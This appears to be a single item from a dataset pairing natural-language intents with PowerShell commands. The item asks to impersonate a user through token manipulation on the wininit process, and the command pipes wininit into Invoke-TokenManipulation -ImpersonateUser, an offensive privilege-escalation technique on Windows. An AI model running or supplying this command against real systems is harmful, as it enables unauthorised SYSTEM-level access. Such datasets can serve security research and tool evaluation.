# Natural language intent:
# Invoke token manipulation on the wininit process to impersonate a user.

Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser
